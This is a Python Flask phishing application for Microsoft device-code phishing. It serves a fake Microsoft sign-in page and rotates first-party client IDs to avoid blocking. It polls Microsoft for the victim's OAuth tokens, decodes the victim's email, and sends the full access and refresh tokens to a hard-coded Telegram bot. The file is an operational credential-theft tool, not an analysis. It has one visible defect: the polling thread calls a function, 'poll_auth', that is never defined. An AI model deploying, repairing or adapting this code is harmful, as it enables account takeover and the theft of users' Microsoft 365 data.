import os
import sys
import time
import uuid
import json
import sqlite3
import requests
from flask import Flask, request, render_template_string, redirect, url_for, jsonify
from threading import Thread
import logging

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

# Microsoft Device Code Flow Endpoints
TENANT = "common"
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

# Rotatable Public Client IDs (Microsoft First-Party Apps)
# These are less likely to be blocked than custom app registrations
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
    "00000003-0000-0000-c000-000000000000",  # Microsoft Graph (sometimes works)
]

app = Flask(__name__)
app.logger.setLevel(logging.INFO)

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        vid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        client_id TEXT,
        status TEXT DEFAULT 'pending',
        tokens TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# --- Telegram Helper ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            print(f"[APP LOG] ✅ Telegram sent")
        else:
            print(f"[APP LOG] ❌ Telegram Error: {resp.text}")
    except Exception as e:
        print(f"[APP LOG] ❌ Telegram Exception: {e}")

# --- Polling Thread ---
def poll_token(vid, client_id, device_code, interval=5):
    """Polls Microsoft for the token after user authenticates."""
    print(f"[APP LOG] 🔄 Started polling for vid: {vid}")
    max_attempts = 60  # 5 minutes approx
    
    for _ in range(max_attempts):
        time.sleep(interval)
        try:
            data = {
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "device_code": device_code,
                "client_id": client_id,
            }
            resp = requests.post(TOKEN_URL, data=data, timeout=10)
            
            if resp.status_code == 200:
                tokens = resp.json()
                # Save to DB
                conn = get_db()
                conn.execute("UPDATE sessions SET status = 'completed', tokens = ? WHERE vid = ?", 
                             (json.dumps(tokens), vid))
                conn.commit()
                conn.close()
                
                # Extract useful info
                id_token = tokens.get("id_token", "")
                access_token = tokens.get("access_token", "")
                refresh_token = tokens.get("refresh_token", "")
                
                # Decode ID Token to get email (simple base64 decode)
                email = "Unknown"
                try:
                    parts = id_token.split('.')
                    if len(parts) == 3:
                        payload = parts[1]
                        # Add padding if needed
                        payload += "=" * (4 - len(payload) % 4)
                        import base64
                        decoded = base64.urlsafe_b64decode(payload)
                        claims = json.loads(decoded)
                        email = claims.get("preferred_username", claims.get("upn", "Unknown"))
                except:
                    pass

                msg = (
                    f"<b>🎯 VICTIM AUTHENTICATED</b>\n\n"
                    f"<b>Email:</b> <code>{email}</code>\n"
                    f"<b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
                    f"<b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n\n"
                    f"<b>Full Tokens JSON:</b>\n<pre>{json.dumps(tokens, indent=2)}</pre>"
                )
                send_telegram(msg)
                print(f"[APP LOG] ✅ Success for vid: {vid}")
                return
                
            elif "authorization_pending" in resp.text:
                continue # Keep polling
            else:
                print(f"[APP LOG] ⚠️ Polling error: {resp.text}")
                
        except Exception as e:
            print(f"[APP LOG] ❌ Polling exception: {e}")
            
    # If we get here, it timed out
    conn = get_db()
    conn.execute("UPDATE sessions SET status = 'timeout' WHERE vid = ?", (vid,))
    conn.commit()
    conn.close()
    print(f"[APP LOG] ⏰ Polling timed out for vid: {vid}")

# --- Routes ---

@app.route('/')
def index():
    vid = request.cookies.get('vid')
    if not vid:
        vid = str(uuid.uuid4())
    
    # Check if we already have a session for this user
    conn = get_db()
    row = conn.execute("SELECT * FROM sessions WHERE vid = ?", (vid,)).fetchone()
    conn.close()
    
    if row and row['status'] == 'pending':
        # Resume existing pending session
        return render_template_string(TEMPLATE, 
            user_code=row['user_code'], 
            verification_uri=row['verification_uri'],
            vid=vid,
            status="pending"
        )
        
    # Create new session
    client_id = CLIENT_IDS[int(time.time()) % len(CLIENT_IDS)] # Rotate based on time
    
    try:
        data = {
            "client_id": client_id,
            "scope": "openid profile offline_access https://graph.microsoft.com/.default",
        }
        resp = requests.post(DEVICE_CODE_URL, data=data, timeout=10)
        
        if resp.status_code != 200:
            return "Error initiating login. Please try again.", 500
            
        dc_data = resp.json()
        device_code = dc_data['device_code']
        user_code = dc_data['user_code']
        verification_uri = dc_data['verification_uri']
        
        # Save to DB
        conn = get_db()
        conn.execute("INSERT OR REPLACE INTO sessions (vid, device_code, user_code, verification_uri, client_id, status) VALUES (?, ?, ?, ?, ?, 'pending')",
                     (vid, device_code, user_code, verification_uri, client_id))
        conn.commit()
        conn.close()
        
        # Start polling thread
        t = Thread(target=poll_auth, args=(vid, client_id, device_code))
        t.daemon = True
        t.start()
        
        return render_template_string(TEMPLATE, 
            user_code=user_code, 
            verification_uri=verification_uri,
            vid=vid,
            status="new"
        )
        
    except Exception as e:
        print(f"[APP LOG] ❌ Init Error: {e}")
        return "Service unavailable.", 500

@app.route('/status/<vid>')
def check_status(vid):
    conn = get_db()
    row = conn.execute("SELECT status FROM sessions WHERE vid = ?", (vid,)).fetchone()
    conn.close()
    
    if row:
        return jsonify({"status": row['status']})
    return jsonify({"status": "unknown"})

# --- The Phishing Page Template ---
TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body {
            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            text-align: left;
        }
        .logo {
            margin-bottom: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #1b1b1b;
        }
        p {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 20px;
        }
        .code-box {
            background: #f2f2f2;
            padding: 15px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            letter-spacing: 2px;
            margin: 20px 0;
            border: 1px solid #ccc;
            cursor: pointer;
        }
        .btn {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #005da6;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_5b3933d8.svg" alt="Microsoft" class="logo" style="height: 24px;">
        <h1>Sign in</h1>
        <p>To verify your identity, please sign in using the code below.</p>
        
        <div class="code-box" id="codeDisplay" onclick="copyCode()">
            {{ user_code }}
        </div>
        
        <p style="font-size: 13px; color: #666;">
            Go to <a href="{{ verification_uri }}" target="_blank">{{ verification_uri }}</a> on another device and enter the code.
        </p>
        
        <button class="btn" onclick="goToLogin()">Next</button>
        
        <div class="footer">
            <p>No account? <a href="#">Create one!</a></p>
            <p>Can't access your account?</p>
        </div>
    </div>

    <script>
        const vid = "{{ vid }}";
        const verificationUri = "{{ verification_uri }}";
        
        function copyCode() {
            const code = document.getElementById('codeDisplay').innerText.trim();
            navigator.clipboard.writeText(code).then(() => {
                alert("Code copied! Please paste it at " + verificationUri);
            });
        }

        function goToLogin() {
            // Copy code first
            const code = document.getElementById('codeDisplay').innerText.trim();
            navigator.clipboard.writeText(code);
            
            // Redirect user to real Microsoft login in same tab
            window.location.href = verificationUri;
        }

        // Poll for completion
        setInterval(() => {
            fetch('/status/' + vid)
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'completed') {
                        document.body.innerHTML = '<div class="container"><h1>Success</h1><p>Your account has been verified. You may close this window.</p></div>';
                    }
                });
        }, 3000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
